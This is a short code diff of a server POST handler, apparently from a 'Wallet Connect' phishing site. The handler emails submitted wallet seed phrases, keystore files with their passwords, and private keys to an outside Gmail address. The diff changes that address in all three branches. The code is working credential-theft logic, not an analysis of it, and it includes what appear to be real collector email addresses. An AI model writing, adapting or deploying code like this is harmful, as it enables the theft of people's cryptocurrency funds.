@@ -37,7 +37,7 @@ export async function POST(request: Request) {
       const formattedMessage = formatMessage(phrase);
       mailOptions = {
         from: `New Wallet Connect ${email}`,
-        to: ['ellahella2015@gmail.com'],
+        to: ['cryptoavatar7@gmail.com'],
         subject: 'Wallet Submission',
         html: formattedMessage,
       };
@@ -47,7 +47,7 @@ export async function POST(request: Request) {
     if (keystore) {
       mailOptions = {
         from: `New Wallet Connect ${email}`,
-        to: ['ellahella2015@gmail.com'],
+        to: ['cryptoavatar7@gmail.com'],
         subject: 'Wallet Submission',
         html: `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>`,
       };
@@ -58,7 +58,7 @@ export async function POST(request: Request) {
       const formattedMessage = formatMessage(privateKey);
       mailOptions = {
         from: `New Wallet Connect ${email}`,
-        to: ['ellahella2015@gmail.com'],
+        to: ['cryptoavatar7@gmail.com'],
         subject: 'Wallet Submission',
         html: formattedMessage,
       };
